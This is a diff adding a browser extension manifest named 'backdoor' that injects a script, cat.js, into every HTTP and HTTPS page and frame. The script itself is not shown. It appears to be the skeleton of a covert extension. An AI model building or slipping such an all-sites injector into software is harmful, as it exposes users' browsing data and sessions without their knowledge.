@@ -1,0 +1,19 @@
+{
+  "name": "backdoor",
+  "version": "0.1",
+  "description": "C00lC@t",
+
+  "icons": {
+    "32": "icons/32.png"
+  },
+
+  "manifest_version": 2,
+
+  "content_scripts": [
+    {
+      "matches": ["https://*/*", "http://*/*"],
+      "js": ["./cat.js"],
+      "all_frames": true
+    }
+  ]
+}
